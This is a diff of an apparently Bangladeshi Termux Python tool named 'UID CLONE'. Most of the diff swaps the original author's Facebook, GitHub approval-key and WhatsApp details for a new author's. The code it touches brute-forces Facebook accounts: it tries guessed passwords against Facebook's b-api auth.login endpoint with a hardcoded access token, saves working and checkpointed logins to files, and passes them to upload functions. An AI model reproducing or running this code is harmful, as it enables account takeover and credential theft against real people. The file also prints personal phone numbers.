@@ -43,9 +43,9 @@ def runtxt(z):
 
 
 def helpnote():
-	print("%s [*] FOLLOW MY FACEBOOK ACCOUNT  :)"%(G))
-	subprocess.check_output(["am", "start", "https://github.com/M41NUL/M41NUL.Approval.txt/blob/main/M41NUL.Approval.txt"])
-	exit(" [*] FACEBOOK :  https://www.facebook.com/Mainul.Islam.Official.Info")
+	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
+	subprocess.check_output(["am", "start", "https://github.com/SHIPONmrs/aprovel.txt/blob/main/aproovel.txt"])
+	exit(" [*] FACEBOOK :  https://www.facebook.com/md12qw")
 
 
 def notice():
@@ -55,7 +55,7 @@ def notice():
 	runtxt("\n\033[0;99m ðŸ”¥YOU ARE NOT PREMIUM USERðŸ”¥ ")
 	runtxt("\033[0;93m SEND THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
 	runtxt("\033[0;93m ADMIN FACEBOOK >> \033[0;92mTERMUX LOVER\033[0;92m")
-	subprocess.check_output(["am", "start", "https://www.facebook.com/Mainul.Islam.Official.Info"])
+	subprocess.check_output(["am", "start", "https://www.facebook.com/md12qw"])
 
 
         
@@ -75,7 +75,7 @@ class Main:
 		self.cp = []
 		self.loop = 0
 		try:
-			plr = requests.get('https://github.com/M41NUL/M41NUL.Approval.txt/blob/main/M41NUL.Approval.txt').txt
+			plr = requests.get('https://github.com/SHIPONmrs/aprovel.txt/blob/main/aproovel.txt').text
 			if basesplit in plr:
 				key = basesplit
 				stat = ("\033[0;92mP R E M I U M")
@@ -94,45 +94,24 @@ class Main:
 		os.system("clear")
 		
 		print ("""\033[1;92m 
-		
-\033[0;95m=========================^×^=========================
-
-
- __        _______ _     ____ ___  __  __ _____  
- \ \      / / ____| |   / ___/ _ \|  \/  | ____| 
-  \ \ /\ / /|  _| | |  | |  | | | | |\/| |  _|   
-   \ V  V / | |___| |__| |__| |_| | |  | | |___  
-    \_/\_/  |_____|_____\____\___/|_|  |_|_____| 
-                                                 
-
-\033[0;95m=========================^×^=========================
-\033[0;94m	     '  ____/
-                   
-\033[1;92m		        
-
-\033[1;31;1m		        
-\33[1;33m
-
-\033[1;31;1m##     ##    ###    #### ##    ## ##     ## ##       
-\033[1;92m###   ###   ## ##    ##  ###   ## ##     ## ##       
-\033[1;31;1m#### ####  ##   ##   ##  ####  ## ##     ## ##       
-\033[1;31;1m## ### ## ##     ##  ##  ## ## ## ##     ## ##       
-\033[1;92m##     ## #########  ##  ##  #### ##     ## ##       
-\033[1;31;1m##     ## ##     ##  ##  ##   ### ##     ## ##       
-\033[1;92m##     ## ##     ## #### ##    ##  #######  ######## 
-
-\33[1;33m
-
+$$\      $$\ $$$$$$$\   $$$$$$\  
+$$$\    $$$ |$$  __$$\ $$  __$$\ 
+$$$$\  $$$$ |$$ |  $$ |$$ /  \__|
+$$\$$\$$ $$ |$$$$$$$  |\$$$$$$\  
+$$ \$$$  $$ |$$  __$$<  \____$$\ 
+$$ |\$  /$$ |$$ |  $$ |$$\   $$ |
+$$ | \_/ $$ |$$ |  $$ |\$$$$$$  |
+\__|     \__|\__|  \__| \______/ 
 
 \033[1;97mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢
-     \033[1;92mâž£ \033[1;92mDEVOLPER   :             
-     \033[1;91mâž£ \033[1;92mFACEBOOK   :              
-     \033[1;93mâž£ \033[1;92mWHATSAPP   :            +8801308850528
-     \033[1;96mâž£ \033[1;92mGITHUB     :            41
-     \033[1;95mâž£ \033[1;92mTOOLS      :             
+     \033[1;92mâž£ \033[1;92mDEVOLPER   :            shipon
+     \033[1;91mâž£ \033[1;92mFACEBOOK   :            shipon
+     \033[1;93mâž£ \033[1;92mWHATSAPP   :            01408675341
+     \033[1;96mâž£ \033[1;92mGITHUB     :            ******
+     \033[1;95mâž£ \033[1;92mTOOLS      :            UID CLON
 \033[1;97mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢
     """)
-		print("%s [%sÃ¢â‚¬Â¢%s] %sTOOL NAME : %sUID CLONE"%(G,R,G,Y,G))
+		print("%s [%sÃ¢â‚¬Â¢%s] %sTOOL NAME : %sUID CLON"%(G,R,G,Y,G))
 		print("%s [%sÃ¢â‚¬Â¢%s] %sVERSION   : %s1.0"%(G,R,G,Y,G))
 		print("%s [%sÃ¢â‚¬Â¢%s] %sYOUR KEY  : %s%s"%(G,R,G,Y,G,key))
 		print("%s [%sÃ¢â‚¬Â¢%s] %sSTATUS    : %s"%(G,R,G,Y,stat)) 
@@ -335,7 +314,7 @@ class Main:
 	def email(self):
 		x = 111
 		xx = 999
-		nam = input("%s [?] TYPE A NAME %s(EX:MAINUL ): "%(Y,G))
+		nam = input("%s [?] TYPE A NAME %s(EX:TAHIDUL ): "%(Y,G))
 		nam = nam.replace(" ", "")
 		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
 		idx = input("%s DOMAIN  : "%(B))
@@ -400,7 +379,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r\r %s\033[0;93m[>_] [] : \033[0;97m %s/%s -> \033[0;92m [ -OK:%s ]- \033[0;93m[-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s\033[0;93m[>_] [KHAN] : \033[0;97m %s/%s -> \033[0;92m [KHAN -OK:%s ]- \033[0;93m[KHAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -417,15 +396,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[-OK] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[KHAN-OK] %s|%s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ok.txt","a").write(" [-OK] %s|%s\n"%(uid, pw))
+				open("ok.txt","a").write(" [KHAN-OK] %s|%s\n"%(uid, pw))
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;93m[-CP] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[KHAN-CP] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [-CP] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [KHAN-CP] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
